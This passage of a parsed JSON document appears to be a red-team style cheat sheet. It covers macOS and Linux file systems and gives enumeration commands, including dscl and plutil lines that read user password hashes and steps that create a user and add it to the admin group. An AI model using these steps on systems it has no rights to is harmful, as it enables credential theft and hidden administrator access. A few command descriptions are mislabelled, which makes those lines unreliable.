      "type": "paragraph",
      "content": "Mac OS Versions",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ID",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Version",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Date Released",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "10.0.4",
      "level": 0,
      "metadata": {
        "file_paths": [
          "10.0.4"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Mac OS X Cheetah",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2001-03-24",
      "level": 0,
      "metadata": {
        "dates": [
          "2001-03-24"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "10.1.5",
      "level": 0,
      "metadata": {
        "file_paths": [
          "10.1.5"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Mac OS X Puma",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2001-09-25",
      "level": 0,
      "metadata": {
        "dates": [
          "2001-09-25"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "10.2.8",
      "level": 0,
      "metadata": {
        "file_paths": [
          "10.2.8"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Mac OS X Jaguar",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2002-08-23",
      "level": 0,
      "metadata": {
        "dates": [
          "2002-08-23"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "10.3.9",
      "level": 0,
      "metadata": {
        "file_paths": [
          "10.3.9"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Mac OS X Panther",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2003-10-24",
      "level": 0,
      "metadata": {
        "dates": [
          "2003-10-24"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "10.4.11",
      "level": 0,
      "metadata": {
        "file_paths": [
          "10.4.11"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Mac OS X Tiger",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2005-04-29",
      "level": 0,
      "metadata": {
        "dates": [
          "2005-04-29"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "10.5.8",
      "level": 0,
      "metadata": {
        "file_paths": [
          "10.5.8"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Mac OS X Leopard",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2007-10-26",
      "level": 0,
      "metadata": {
        "dates": [
          "2007-10-26"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "10.6.8",
      "level": 0,
      "metadata": {
        "file_paths": [
          "10.6.8"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Mac OS X Snow Leopard",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2009-08-28",
      "level": 0,
      "metadata": {
        "dates": [
          "2009-08-28"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "10.7.5",
      "level": 0,
      "metadata": {
        "file_paths": [
          "10.7.5"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "OS X Lion",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2011-07-20",
      "level": 0,
      "metadata": {
        "dates": [
          "2011-07-20"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "10.8.5",
      "level": 0,
      "metadata": {
        "file_paths": [
          "10.8.5"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "OS X Mountain Lion",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2012-07-25",
      "level": 0,
      "metadata": {
        "dates": [
          "2012-07-25"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "10.9.5",
      "level": 0,
      "metadata": {
        "file_paths": [
          "10.9.5"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "OS X Mavericks",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2013-10-22",
      "level": 0,
      "metadata": {
        "dates": [
          "2013-10-22"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "10.10.5",
      "level": 0,
      "metadata": {
        "file_paths": [
          "10.10.5"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "OS X Yosemite",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2014-10-16",
      "level": 0,
      "metadata": {
        "dates": [
          "2014-10-16"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "10.11.6",
      "level": 0,
      "metadata": {
        "file_paths": [
          "10.11.6"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "OS X El Capitan",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2015-09-30",
      "level": 0,
      "metadata": {
        "dates": [
          "2015-09-30"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "10.12.6",
      "level": 0,
      "metadata": {
        "file_paths": [
          "10.12.6"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "macOS Sierra",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2016-09-20",
      "level": 0,
      "metadata": {
        "dates": [
          "2016-09-20"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "10.13.6",
      "level": 0,
      "metadata": {
        "file_paths": [
          "10.13.6"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "macOS High Sierra",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2017-09-25",
      "level": 0,
      "metadata": {
        "dates": [
          "2017-09-25"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "10.14.6",
      "level": 0,
      "metadata": {
        "file_paths": [
          "10.14.6"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "macOS Mojave",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2018-09-24",
      "level": 0,
      "metadata": {
        "dates": [
          "2018-09-24"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "10.15.7",
      "level": 0,
      "metadata": {
        "file_paths": [
          "10.15.7"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "macOS Catalina",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2019-10-07",
      "level": 0,
      "metadata": {
        "dates": [
          "2019-10-07"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "11.6.7",
      "level": 0,
      "metadata": {
        "file_paths": [
          "11.6.7"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "macOS Big Sur",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2020-11-12",
      "level": 0,
      "metadata": {
        "dates": [
          "2020-11-12"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "12.4",
      "level": 0,
      "metadata": {
        "file_paths": [
          "12.4"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "macOS Monterey",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2021-10-25",
      "level": 0,
      "metadata": {
        "dates": [
          "2021-10-25"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "File System Structure",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/Applications",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Contains applications such as Mail, Calendar, Safari, and many others",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/bin",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "User binaries",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/dev",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Interface for system devices",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/cores",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Hidden binary files which contain pieces of computer memory. Used for debugging purposes",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/etc",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "System configuration files",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/Users",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Base directory for user files",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/Library",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Critical software libraries",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/home",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Not used for anything",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/private",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Stores essential system files and caches",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/opt",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Third party software",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/sbin",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "System administrator binaries",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/System",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Contains operating system files",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/tmp",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Temporary files",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/usr",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Less critical files",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/Volumes",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Shows mounted volumes",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/var",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Variable system files",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Mac OS System Enumeration",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "This section details system enumeration and user/group manipulation commands. It is worth noting user management and authentication in Mac OS is accomplished much differently than Linux. Shadow/Passwd files are not used and user information is stored in “.plist” files.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Mac OS Situational Awareness",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ls /Applications",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display apps",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "hostname",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display computer name",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "id",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Current username",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "w",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List logged on users",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "last",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List previous user log in sessions",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "df -h",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Disk usage",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "uname -a",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Kernel version & CPU information",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "mount",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List mounted drives",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sw_vers",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display OS version information",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "echo $0",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display shell type",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ls /Users",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Enumerate user home directories",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ifconfig -a",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Network and IP information",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ps -ef",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Process enumeration",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "kill -9 <PID>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Kill process PID",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ps -ef | grep -ia <STRING_TO_SEARCH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Find specific process",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "netstat -p tcp -van",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Check for active TCP network connections",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sudo nano /etc/paths",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Add another variable to the PATH",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "User Plist File Enumeration",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "As mentioned above, Mac OS stores user information (including user password hashes) in files called property lists (.plist). With administrative credentials, these can be directly enumerated, and user hashes can be collected.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sudo plutil -p /var/db/dslocal/nodes/Default/users/<USERNAME>.plist",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Enumerate user plist information",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sudo dscl . read Users/<USERNAME> ShadowHashData",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Enumerate user password hash",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "User enumeration & Modification",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dscl . list /Users",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display all user and daemon accounts",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dscl . list /Users | grep -v '_'",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Display actual user accounts (No daemon accounts)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dscacheutil -q user",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Display verbose user information (shell type, gid, uid, full name, description, etc.)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dscl . -read /Users/<USERNAME>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Display very verbose user information (user hash included)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dscacheutil -q group -a name <GROUP_NAME>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Enumerate a specific user's group assignments",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dscl . -delete /Users/<USERNAME>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Delete user",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Create user & make administrator",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dscl . -create /Users/<USERNAME>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Create User",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dscl . -create /Users/<USERNAME> UserShell /bin/bash",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Set shell preferences for user",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dscl . -create /Users/<USERNAME> RealName \"<USER_FULL_NAME>\"",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Set user full name",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dscl . list /Users UniqueID",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List out ID’s and select an un-used ID",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dscl . -create /Users/<USERNAME> UniqueID \"<NEWLY_SELECTED_ID>\"",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Set unique ID for user",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dscl . -create /Users/<USERNAME> PrimaryGroupID 20",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Give list of users that belong to a group.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dscl . -create /Users/<USERNAME> NFSHomeDirectory /Users/<USERNAME>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "mkdir /Users/<USERNAME>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Make home directory",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dscl . -passwd /Users/<USERNAME> <NEW_PASSWORD>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Set user password",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dscl . -append /Groups/admin GroupMembership <USERNAME>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Add user to admin group",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Create A Group",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sudo dscl . -create /Groups/<GROUPNAME>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Create group",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sudo dscl . -create /Groups/<GROUPNAME> RealName \"Service and Support\"",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Add longform name",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sudo dscl . -create /Groups/<GROUPNAME> passwd \"*\"",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Initialize group password",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dscl . list /Groups PrimaryGroupID | tr -s ' ' | sort -n -t ' ' -k2,2",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Find unused group ID",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sudo dscl . -create /Groups/<GROUPNAME> gid <NEWLY_SELECTED_ID>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Assign group ID",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sudo dscl . -create /Groups/<GROUPNAME> GroupMembership <USERNAME>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Assign only ONE user to group (will overwrite with this ONE user)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Group enumeration & Modification",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dscacheutil -q group",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Enumerate all groups and their members",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sudo dscl . -append /Groups/<GROUPNAME> GroupMembership <USERNAME>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Append user to group",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sudo dscl . -delete /Groups/<GROUPNAME> GroupMembership <USERNAME >",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Remove user from group",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dscl . -delete /Groups/<GROUPNAME>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Delete group",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "*Nix",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Linux OS Details",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "File System Structure",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Anchor and root of the filesystem",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/bin",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "User binaries",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/boot",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Boot-up related files",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/dev",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Interface for system devices",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/etc",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "System configuration files",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/home",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Base directory for user files",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/lib",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Critical software libraries",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/opt",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Third party software",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/proc",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "System and running programs",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/root",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Home directory of root user",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/sbin",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "System administrator binaries",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/tmp",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Temporary files",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/usr",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Contains all the system files. Less critical files",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/var",
      "level": 0,
      "metadata": {
